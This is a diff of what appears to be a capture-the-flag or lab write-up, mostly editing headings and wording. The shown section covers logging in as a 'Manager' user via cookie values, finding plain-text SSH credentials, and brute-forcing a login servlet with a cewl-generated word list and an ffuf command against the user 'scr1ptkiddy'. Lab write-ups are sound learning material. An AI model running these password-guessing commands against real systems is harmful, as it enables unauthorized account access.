@@ -226,7 +226,9 @@ The only difference in the response is that the _svpLogin_ field in the _Set-Coo
 
 After setting the cookie values on the browser console the same way as before, I navigated to the URL (in the _Location_ field of the response headers), and was presented with a dashboard as the user **Manager**. I went on to read the message notifications and found the SSH credentials in plain-text.&#x20;
 
-#### Method 3: Experimenting with cewl
+
+
+**Method 3: Experimenting with CeWL**
 
 Generating a custom word list
 
@@ -234,11 +236,9 @@ Generating a custom word list
 $ cewl http://<target_machine_URL>:80 -w passwords.txt
 ```
 
-Using the word list with _**ffuf**_ as password for the _**scr1ptkiddy**_ user?
+Using the generated passwords word list with _**ffuf,**_ for the _**scr1ptkiddy**_ user
 
 ```bash
-
-
 $ ffuf -X POST -u http://<target_machine_URL>:8080/AuthenticationServlet?Login=scr1ptkiddy&password=FUZZ&DomainId=0 -w passwords.txt 
 ```
 
